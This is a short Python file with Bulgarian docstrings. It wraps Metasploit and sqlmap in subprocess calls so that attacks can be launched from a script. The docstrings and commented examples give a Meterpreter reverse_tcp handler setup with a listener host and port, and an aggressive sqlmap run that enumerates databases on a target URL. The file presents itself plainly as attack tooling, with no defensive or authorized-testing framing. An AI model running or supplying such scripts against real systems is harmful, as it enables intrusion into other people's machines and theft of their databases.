import subprocess

def metasploit_exploit(options):
    """
    Изпълнява експлойт с Metasploit Framework.

    Args:
        options: Опции за Metasploit (напр. "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 4444; exploit").

    Returns:
        Резултат от изпълнението на експлойта.
    """
    command = ["msfconsole", "-q", "-x", options]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode()

def sqlmap_exploit(target, options=""):
    """
    Изпълнява SQL injection атака с SQLmap.

    Args:
        target: URL адрес на целта.
        options: Допълнителни опции за SQLmap (напр. "--dbs --level 5 --risk 3").

    Returns:
        Резултат от изпълнението на атаката.
    """
    command = ["sqlmap", "-u", target]
    if options:
        command.extend(options.split())
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode()

# Примери за използване:

# result = metasploit_exploit("use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 4444; exploit")
# print(result)

# result = sqlmap_exploit("http://example.com/vulnerable.php?id=1", "--dbs --level 5 --risk 3")
# print(result)